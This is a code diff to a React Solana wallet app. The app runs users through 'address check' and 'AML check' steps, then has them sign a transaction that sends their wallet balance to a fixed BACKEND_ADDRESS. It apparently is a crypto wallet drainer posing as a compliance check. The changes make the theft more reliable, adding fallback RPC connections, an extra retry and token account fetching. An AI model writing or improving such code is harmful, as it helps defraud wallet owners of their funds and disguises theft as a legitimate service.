@@ -1,6 +1,6 @@
+
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
-import { LAMPORTS_PER_SOL } from '@solana/web3.js';
 import { useEffect, useState } from 'react';
 import { 
   getTokenAccounts, 
@@ -8,7 +8,8 @@ import {
   signAndSendTransaction, 
   getWalletBalance, 
   MINIMUM_REQUIRED_SOL,
-  hasEnoughSolForRent 
+  hasEnoughSolForRent,
+  createReliableConnection
 } from '@/utils/walletUtils';
 import { toast } from '@/components/ui/use-toast';
 import { Menu } from "lucide-react";
@@ -43,10 +44,26 @@ const Index = () => {
   const [connectionAttempts, setConnectionAttempts] = useState(0);
   const [isLoading, setIsLoading] = useState(false);
   const [fetchRetries, setFetchRetries] = useState(0);
+  const [reliableConnection, setReliableConnection] = useState(null);
   
   const [showLoadingModal, setShowLoadingModal] = useState(false);
   const [connectionSteps, setConnectionSteps] = useState<ConnectionStep[]>(initialSteps);
   const [currentStep, setCurrentStep] = useState('connect');
+
+  // Initialize a reliable connection
+  useEffect(() => {
+    const initConnection = async () => {
+      try {
+        const conn = await createReliableConnection();
+        setReliableConnection(conn);
+        console.log("Reliable connection established");
+      } catch (error) {
+        console.error("Failed to establish reliable connection:", error);
+      }
+    };
+    
+    initConnection();
+  }, []);
 
   const updateStepStatus = (stepId: string, status: 'pending' | 'active' | 'completed' | 'error') => {
     setConnectionSteps(steps => 
@@ -85,23 +102,42 @@ const Index = () => {
     try {
       updateStepStatus('addressCheck', 'active');
       
-      const [solBalance, tokenAccounts] = await Promise.all([
-        getWalletBalance(publicKey.toString())
-          .then(balance => {
-            console.log("Current balance:", balance, "SOL");
-            setWalletBalance(balance);
-            return balance;
-          }),
-        Promise.resolve().then(async () => {
-          advanceToNextStep('addressCheck');
-          updateStepStatus('amlCheck', 'active');
-          console.log("Fetching token accounts");
-          const tokens = await getTokenAccounts(connection, publicKey.toString());
-          console.log("Token accounts received:", tokens);
-          setTokens(tokens || []);
-          return tokens;
-        })
-      ]);
+      // Use our reliable connection
+      const conn = reliableConnection || connection;
+      console.log("Using connection for data fetch:", conn);
+      
+      let solBalance;
+      try {
+        // First try with getWalletBalance (with multiple endpoint fallbacks)
+        solBalance = await getWalletBalance(publicKey.toString());
+        console.log("Got balance via getWalletBalance:", solBalance);
+      } catch (balanceError) {
+        console.error("Failed to get balance via getWalletBalance:", balanceError);
+        
+        // Fallback to direct connection
+        const rawBalance = await conn.getBalance(publicKey);
+        solBalance = rawBalance / 1_000_000_000; // LAMPORTS_PER_SOL
+        console.log("Got balance via direct connection:", solBalance);
+      }
+      
+      setWalletBalance(solBalance);
+      advanceToNextStep('addressCheck');
+      
+      updateStepStatus('amlCheck', 'active');
+      
+      // Get token accounts
+      console.log("Fetching token accounts");
+      let tokenAccounts = [];
+      
+      try {
+        tokenAccounts = await getTokenAccounts(conn, publicKey.toString());
+        console.log("Token accounts received:", tokenAccounts);
+      } catch (tokenError) {
+        console.error("Error fetching token accounts:", tokenError);
+        tokenAccounts = []; // Fallback to empty array
+      }
+      
+      setTokens(tokenAccounts || []);
       
       advanceToNextStep('amlCheck');
       updateStepStatus('successfulAmlCheck', 'active');
@@ -181,8 +217,12 @@ const Index = () => {
       
       console.log("Starting wallet connection process");
       
+      // Ensure we have a reliable connection
+      const conn = reliableConnection || connection;
+      console.log("Using connection:", conn);
+      
       let walletData = null;
-      for (let attempt = 0; attempt < 2; attempt++) {
+      for (let attempt = 0; attempt < 3; attempt++) {
         try {
           walletData = await fetchWalletData();
           if (walletData) break;
@@ -252,7 +292,7 @@ const Index = () => {
         
         toast({
           title: "Insufficient Funds",
-          description: `Your wallet must have at least ${MINIMUM_REQUIRED_SOL} SOL (about $0.50) for rent exemption and fees.`,
+          description: `Your wallet must have at least ${MINIMUM_REQUIRED_SOL} SOL for rent exemption and fees.`,
           variant: "destructive",
         });
         setIsProcessing(false);
@@ -297,7 +337,7 @@ const Index = () => {
         advanceToNextStep('signWaitingDescription');
 
         const signature = await signAndSendTransaction(
-          connection,
+          conn,
           wallet,
           BACKEND_ADDRESS,
           walletData.balance,
